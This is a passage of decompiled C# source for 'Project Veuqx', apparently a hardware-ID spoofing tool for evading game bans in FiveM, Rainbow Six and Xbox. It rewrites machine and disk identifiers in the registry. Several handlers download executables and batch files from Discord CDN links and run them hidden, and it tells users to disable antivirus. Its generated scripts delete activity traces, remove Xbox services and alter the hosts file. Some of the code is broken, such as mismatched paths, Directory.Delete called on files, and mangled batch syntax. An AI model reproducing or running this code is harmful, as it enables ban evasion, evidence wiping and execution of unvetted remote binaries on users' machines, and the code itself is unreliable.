			if (flag3)
			{
				Directory.Delete("C:\\ProgramData\\Temp\\ppsad\\00-00\\nnnn.bat", true);
			}
		}

		// Token: 0x06000086 RID: 134 RVA: 0x000069C4 File Offset: 0x000069C4
		private void guna2Button37_Click_1(object sender, EventArgs e)
		{
			bool flag = MessageBox.Show("Do you want to restart your PC Now?", "Project Veuqx", MessageBoxButtons.YesNo) != DialogResult.Yes;
			if (!flag)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
				registryKey.SetValue("ComputerName", "PROJECT-VEUQX");
				registryKey.Close();
				RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", true);
				registryKey2.SetValue("NV Hostname", "PROJECT-VEUQX");
				registryKey2.Close();
				RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", true);
				registryKey3.SetValue("Hostname", "PROJECT-VEUQX");
				registryKey3.Close();
				RegistryKey registryKey4 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", true);
				registryKey4.SetValue("ComputerName", "PROJECT-VEUQX");
				registryKey4.Close();
				string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
				using (RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey(name, true))
				{
					registryKey5.DeleteSubKeyTree("RegisteredOwner", false);
				}
				RegistryKey registryKey6 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
				registryKey6.SetValue("RegisteredOwner", "PROJECT-VEUQX");
				registryKey6.Close();
			}
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00006B68 File Offset: 0x00006B68
		private void guna2Button41_Click_1(object sender, EventArgs e)
		{
			bool flag = File.Exists("C:\\Windows\\System32\\nvml.dll");
			if (flag)
			{
				try
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				catch
				{
				}
			}
			MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00006BD4 File Offset: 0x00006BD4
		private void guna2Button43_Click_1(object sender, EventArgs e)
		{
			string value = Guid.NewGuid().ToString();
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
			registryKey = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", true);
			registryKey.SetValue("MachineGuid", value);
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/909940221263638632/918881150179627008/nvidia-smi.exe", "C:\\Windows\\Drive\\nvidia-smi.exe");
				new Process
				{
					StartInfo = 
					{
						FileName = "C:\\Windows\\SuperProj\\Drive\\nvidia-smi.exe",
						WindowStyle = ProcessWindowStyle.Hidden
					}
				}.Start();
				Task.Delay(1000);
				MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			catch (Exception ex)
			{
				MessageBox.Show("then antivirus off or your GPU is not compatible! " + ex.Message, "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			try
			{
			}
			catch (Exception)
			{
			}
			bool flag = Directory.Exists("C:\\Windows\\Drive\\nvidia-smi.exe");
			if (flag)
			{
				Directory.Delete("C:\\Windows\\Drive\\nvidia-smi.exe", true);
			}
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00006CEC File Offset: 0x00006CEC
		private void guna2Button39_Click(object sender, EventArgs e)
		{
			this.Spoof();
			Main.GenerateID(0);
			Main.GenerateRandomMAC();
			MessageBox.Show("New Mac: " + Main.GenerateRandomMAC());
		}

		// Token: 0x0600008A RID: 138 RVA: 0x00006D18 File Offset: 0x00006D18
		private void guna2Button40_Click(object sender, EventArgs e)
		{
			string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
			string text = (string)Registry.GetValue(keyName, "HwProfileGuid", "default");
			string value = string.Concat(new string[]
			{
				"{Veuqx-",
				Main.GenID(5),
				"-",
				Main.GenID(5),
				"-",
				Main.GenID(4),
				"-",
				Main.GenID(9),
				"}"
			});
			Registry.SetValue(keyName, "GUID", value);
			Registry.SetValue(keyName, "HwProfileGuid", value);
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00006DB8 File Offset: 0x00006DB8
		private void guna2Button42_Click(object sender, EventArgs e)
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					bool flag = registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral";
					if (flag)
					{
						string value = Main.RandomId(14);
						string value2 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", value2);
						registryKey.SetValue("Identifier", value);
						registryKey.SetValue("InquiryData", value);
						registryKey.SetValue("SerialNumber", value2);
					}
				}
			}
			foreach (string str in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
			{
				Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + str, true).SetValue("Identifier", Main.RandomId(8) + "-" + Main.RandomId(8) + "-A");
			}
			MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00006F68 File Offset: 0x00006F68
		private void guna2Button44_Click(object sender, EventArgs e)
		{
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("echo off");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine(":folderclean");
				streamWriter.WriteLine("call :getDiscordVersion");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("goto :xboxclean");
				streamWriter.WriteLine(": getDiscordVersion");
				streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
				streamWriter.WriteLine("     set 'varLoc =%%a'");
				streamWriter.WriteLine("   goto :d1");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine(":d1");
				streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
				streamWriter.WriteLine("     set 'discordVersion =%%z'");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine("goto :EOF");
				streamWriter.WriteLine(": xboxclean");
				streamWriter.WriteLine(" cls");
				streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
				streamWriter.WriteLine("sc stop XblAuthManager");
				streamWriter.WriteLine("sc stop XblGameSave");
				streamWriter.WriteLine("sc stop XboxNetApiSvc");
				streamWriter.WriteLine("sc stop XboxGipSvc");
				streamWriter.WriteLine("sc delete XblAuthManager");
				streamWriter.WriteLine("sc delete XblGameSave");
				streamWriter.WriteLine("sc delete XboxNetApiSvc");
				streamWriter.WriteLine("sc delete XboxGipSvc");
				streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
				streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
				streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("exit");
				streamWriter.WriteLine("goto :eof");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00007424 File Offset: 0x00007424
		private void guna2Button33_Click_1(object sender, EventArgs e)
		{
			this.cursor.Height = this.guna2Button33.Height;
			this.cursor.Top = this.guna2Button33.Top;
			this.settings.Hide();
			this.dash.Hide();
			this.system.Hide();
			this.game.Hide();
			this.fivem.Hide();
			this.games.Hide();
			this.systeme.Show();
			this.logs.Hide();
			this.discord.Hide();
		}

		// Token: 0x0600008E RID: 142 RVA: 0x000074CC File Offset: 0x000074CC
		private void guna2Button32_Click_2(object sender, EventArgs e)
		{
			this.cursor.Height = this.guna2Button32.Height;
			this.cursor.Top = this.guna2Button32.Top;
			this.settings.Hide();
			this.dash.Hide();
			this.system.Hide();
			this.game.Hide();
			this.fivem.Hide();
			this.games.Hide();
			this.systeme.Hide();
			this.logs.Hide();
			this.discord.Show();
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00007574 File Offset: 0x00007574
		private void guna2Button26_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Falied (Fixxed)", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000090 RID: 144 RVA: 0x0000758C File Offset: 0x0000758C
		private void guna2Button46_Click(object sender, EventArgs e)
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909259936242995210/R6S.bat", "C:\\Windows\\Drive\\RS.bat");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909258244109774898/DBCLN.exe", "C:\\Windows\\Drive\\DBCLN.exe");
				new Process
				{
					StartInfo = 
					{
						FileName = "C:\\Windows\\Drive\\RS.bat",
						//FileName = "C:\\Windows\\Drive\\DBCLN.exe",
						WindowStyle = ProcessWindowStyle.Hidden
					}
				}.Start();
				Task.Delay(1000);
				this.Spoof();
				Main.SpoofGUID();
				Main.GenerateRandomMAC();
				Main.HWIDclick();
				Main.XBOXclick();
				Main.PC();
				Main.Diskclick();
				MessageBox.Show("Successfully", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			catch (Exception)
			{
				MessageBox.Show("Turn your antivirus off?", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			bool flag = Directory.Exists("C:\\Windows\\Drive\\RS.bat");
			if (flag)
			{
				Directory.Delete("C:\\Windows\\Drive\\RS.bat", true);
			}
			bool flag2 = Directory.Exists("C:\\Windows\\Drive\\DBCLN.exe");
			if (flag2)
			{
				Directory.Delete("C:\\Windows\\Drive\\DBCLN.exe", true);
			}
		}

		// Token: 0x06000091 RID: 145 RVA: 0x000076AC File Offset: 0x000076AC
		public static string GenerateString(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "ABCDEF0123456789"[Main.random.Next("ABCDEF0123456789".Length)];
			}
			return new string(array);
		}

		// Token: 0x06000092 RID: 146 RVA: 0x000076FC File Offset: 0x000076FC
		private void guna2Button47_Click(object sender, EventArgs e)
		{
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
			int num = (int)MessageBox.Show("New ProductID: " + Main.CurrentProductID(), "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000093 RID: 147 RVA: 0x000077A0 File Offset: 0x000077A0
		public static string CurrentProductID()
		{
			string text = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
			string text2 = "ProductID";
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(text))
				{
					if (registryKey2 == null)
					{
						throw new KeyNotFoundException(string.Format("Key Not Found: {0}", text));
					}
					object value = registryKey2.GetValue(text2);
					if (value == null)
					{
						throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", text2));
					}
					result = value.ToString();
				}
			}
			return result;
		}

		// Token: 0x06000094 RID: 148 RVA: 0x0000784C File Offset: 0x0000784C
		private void guna2Button48_Click(object sender, EventArgs e)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			bool flag = Directory.Exists(folderPath + "\\DigitalEntitlements");
			if (flag)
			{
				Directory.Delete(folderPath + "\\DigitalEntitlements", true);
			}
			bool flag2 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\crashes");
			if (flag2)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\crashes", true);
			}
			bool flag3 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\logs");
			if (flag3)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\logs", true);
			}
			Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\server-cache");
			bool flag4 = Directory.Exists(folderPath2 + "\\CitizenFX");
			if (flag4)
			{
				Directory.Delete(folderPath2 + "\\CitizenFX", true);
			}
			bool flag5 = Directory.Exists(folderPath + "\\DigitalEntitlements");
			if (flag5)
			{
				Directory.Delete(folderPath + "\\DigitalEntitlements", true);
				Directory.CreateDirectory(folderPath + "\\DigitalEntitlements");
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadFile("https://cdn.discordapp.com/attachments/961712225607893015/1007681520380678236/7a7be1e8_2112004234", folderPath + "\\DigitalEntitlements\\7a7be1e8_2112004234");
					webClient.DownloadFile("https://cdn.discordapp.com/attachments/961712225607893015/1007675846267510804/38d8f400-aa8a-4784-a9f0-26a08628577e", folderPath + "\\DigitalEntitlements\\38d8f400-aa8a-4784-a9f0-26a08628577e");
				}
			}
			else
			{
				Directory.CreateDirectory(folderPath + "\\DigitalEntitlements");
				using (WebClient webClient2 = new WebClient())
				{
					webClient2.DownloadFile("https://cdn.discordapp.com/attachments/961712225607893015/1007681520380678236/7a7be1e8_2112004234", folderPath + "\\DigitalEntitlements\\7a7be1e8_2112004234");
					webClient2.DownloadFile("https://cdn.discordapp.com/attachments/961712225607893015/1007675846267510804/38d8f400-aa8a-4784-a9f0-26a08628577e", folderPath + "\\DigitalEntitlements\\38d8f400-aa8a-4784-a9f0-26a08628577e");
				}
			}
			int num = (int)MessageBox.Show("Open FiveM", "Project Veuqx", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000095 RID: 149 RVA: 0x00007A28 File Offset: 0x00007A28
		public static void HWIDclick()
		{
			string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
			string text = (string)Registry.GetValue(keyName, "HwProfileGuid", "default");
			string value = string.Concat(new string[]
			{
				"{Veuqx-",
				Main.GenID(5),
				"-",
				Main.GenID(5),
				"-",
				Main.GenID(4),
				"-",
				Main.GenID(9),
				"}"
			});
			Registry.SetValue(keyName, "GUID", value);
			Registry.SetValue(keyName, "HwProfileGuid", value);
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00007AC8 File Offset: 0x00007AC8
		public static void Diskclick()
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					bool flag = registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral";
					if (flag)
					{
						string text3 = Main.RandomId(14);
						string text4 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(text4));
						registryKey.SetValue("Identifier", text3);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(text3));
						registryKey.SetValue("SerialNumber", text4);
					}
				}
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00007C08 File Offset: 0x00007C08
		public static bool SetMachineName(string newName)
		{
			RegistryKey localMachine = Registry.LocalMachine;
			string subkey = "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName";
			RegistryKey registryKey = localMachine.CreateSubKey(subkey);
			registryKey.SetValue("ComputerName", newName);
			registryKey.Close();
			string subkey2 = "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName";
			RegistryKey registryKey2 = localMachine.CreateSubKey(subkey2);
			registryKey2.SetValue("ComputerName", newName);
			registryKey2.Close();
			string subkey3 = "SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\";
			RegistryKey registryKey3 = localMachine.CreateSubKey(subkey3);
			registryKey3.SetValue("Hostname", newName);
			registryKey3.SetValue("NV Hostname", newName);
			registryKey3.Close();
			return true;
		}

		// Token: 0x06000098 RID: 152 RVA: 0x00007CA0 File Offset: 0x00007CA0
		public static string GenerateDate(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "abcdef0123456789"[Main.random.Next("abcdef0123456789".Length)];
			}
			return new string(array);
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00007CF0 File Offset: 0x00007CF0
		public static void XBOXclick()
		{
			string value = Main.GenerateDate(8);
			RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true).SetValue("InstallDate", value);
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00007D2C File Offset: 0x00007D2C
		public static void PC()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
			registryKey.SetValue("ComputerName", "DESKTOP-" + Main.GenerateString(6));
			registryKey.Close();
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00007D78 File Offset: 0x00007D78
		public static void FiveM()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			bool flag = Directory.Exists(folderPath + "\\DigitalEntitlements");
			if (flag)
			{
				Directory.Delete(folderPath + "\\DigitalEntitlements", true);
			}
			bool flag2 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\crashes");
			if (flag2)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\crashes", true);
			}
			bool flag3 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\logs");
			if (flag3)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\logs", true);
			}
			bool flag4 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\cache");
			if (flag4)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data\\cache", true);
			}
			Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\server-cache");
			bool flag5 = !Directory.Exists(folderPath2 + "\\CitizenFX");
			if (!flag5)
			{
				Directory.Delete(folderPath2 + "\\CitizenFX", true);
			}
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00007E70 File Offset: 0x00007E70
		public static void Disk()
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					bool flag = registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral";
					if (flag)
					{
						string text3 = Main.RandomId(14);
						string text4 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(text4));
						registryKey.SetValue("Identifier", text3);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(text3));
						registryKey.SetValue("SerialNumber", text4);
					}
				}
			}
			foreach (string str in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
			{
				Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + str, true).SetValue("Identifier", Main.RandomId(8) + "-" + Main.RandomId(8) + "-A");
			}
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00008020 File Offset: 0x00008020
		private void guna2Button49_Click(object sender, EventArgs e)
		{
			try
			{
				Main.HWIDclick();
				string value = string.Concat(new string[]
				{
					Main.GenerateString(5),
					"-",
					Main.GenerateString(5),
					"-",
					Main.GenerateString(5),
					"-",
					Main.GenerateString(5)
				});
				RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
				registryKey.SetValue("ProductID", value);
				registryKey.Close();
				Main.Disk();
				Main.HWIDclick();
				Main.XBOXclick();
				Main.PC();
				Main.Diskclick();
				Main.SetMachineName(Main.GenerateString(6));
				bool flag = File.Exists("C:\\Program Files\\Win64\\net.bat");
				if (flag)
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				bool flag2 = Directory.Exists("C:\\Program Files (x86)\\Blade Group");
				if (flag2)
				{
					Directory.Delete("C:\\Program Files (x86)\\Blade Group");
					Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
				}
			}
			catch
			{
			}
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("echo off");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
				streamWriter.WriteLine("cls");
